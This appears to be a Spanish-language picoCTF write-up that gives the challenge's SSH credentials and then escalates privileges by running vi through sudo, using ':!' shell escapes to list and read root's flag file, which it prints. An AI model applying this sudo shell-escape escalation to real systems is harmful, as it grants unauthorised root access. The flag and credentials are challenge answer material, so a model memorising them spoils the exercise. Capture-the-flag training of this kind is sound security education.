### Descripción
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
#### Una vez iniciada la instancia del desafío:
The system admin has provisioned an account for you on the main server:`ssh -p 60418 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?
### Solución
En el shell virtual de la página, iniciamos colocando el comando **ssh** para hacer la conexión vía remota al servidor, donde después de ingresar la contraseña proporcionada por la descripción del reto, accedemos al servidor como se puede ver a continuación:

```shell
the_robx-picoctf@webshell:~$ ssh -p 60418 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:60418 ([13.59.203.175]:60418)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:60418' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Una vez dentro, hacemos un **ls** para poder ver el contenido del directorio donde estamos pero no muestra nada, por lo que usamos `cd /` para cambiarnos al directorio raíz, una vez ahí volvemos a hacer un ls para ver el contenido del directorio raíz:

```shell
picoplayer@challenge:~$ ls
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Usamos el argumento **-la** para obtener mas detalles del contenido del directorio raíz, de aquí es donde resulta llamativo el directorio **root**:

```shell
picoplayer@challenge:/$ ls -la
total 0
drwxr-xr-x   1 root   root     51 Feb 20 01:24 .
drwxr-xr-x   1 root   root     51 Feb 20 01:24 ..
-rwxr-xr-x   1 root   root      0 Feb 20 01:24 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 20 01:24 dev
drwxr-xr-x   1 root   root     66 Feb 20 01:24 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 323 nobody nogroup   0 Feb 20 01:24 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Feb 20 01:27 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 20 01:24 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
```

Se hace el intento de acceder al contenido del directorio **root** mediante ls, pero como podemos ver a continuación, no tenemos el permiso para hacer la acción:

```shell
picoplayer@challenge:/$ ls root/
ls: cannot open directory 'root/': Permission denied
```

Por eso se recurre a usar el comando **sudo -l** para conocer los privilegios del usuario actual, una vez ingresada la contraseña, podemos ver solo tenemos los permisos para vi (que es un editor de texto que maneja en memoria el texto entero de un archivo):

```shell
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Por lo que nos disponemos a usar el comando vi, con lo cual nos abre un editor de texto:

```shell
picoplayer@challenge:/$ vi
```

Una vez dentro de ahí intentamos volver a ejecutar el comando **ls /root**:

```
:! ls /root
```

Por lo que una vez digitado nos muestra lo siguiente:

```
ls: cannot open directory '/root': Permission denied

shell returned 2

Press ENTER or type command to continue
```

Entonces cerramos ese editor vi con **:q**, una vez fuera ingresamos a vi pero ahora en modo **sudo** (superusuario):

```
picoplayer@challenge:/$ sudo vi
[sudo] password for picoplayer: 
```

Después de ingresar la contraseña para sudo, ingresamos el comando ls -al /root para conocer con más detalle el contenido de ese directorio:

```
:! ls -al /root
```

Ahora nos muestra la lista de archivos donde resalta el archivo de texto "*.flag.txt*", ya que se supone que contiene la bandera para solucionar este reto:

```
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 20 01:40 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```

Una vez más dentro de vi, ejecutamos el comando **cat** para ver el contenido del archivo de texto *.flag.txt*.

```
:! cat /root/.flag.txt
```

Con lo que ahora sí por fin nos arroja la bandera que resuelve este reto:

```
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
```
### Notas Adicionales
En el caso de vi `:!`, el prefijo `:` es usado para entrar en el modo de comandos de `vi`, y el `!` indica que se desea ejecutar un comando de sistema (como si fuera una terminal normal)
### Referencias
https://www.ionos.mx/digitalguide/servidores/configuracion/linux-sudo/
https://www.linuxtotal.com.mx/index.php?cont=info_admon_010#google_vignette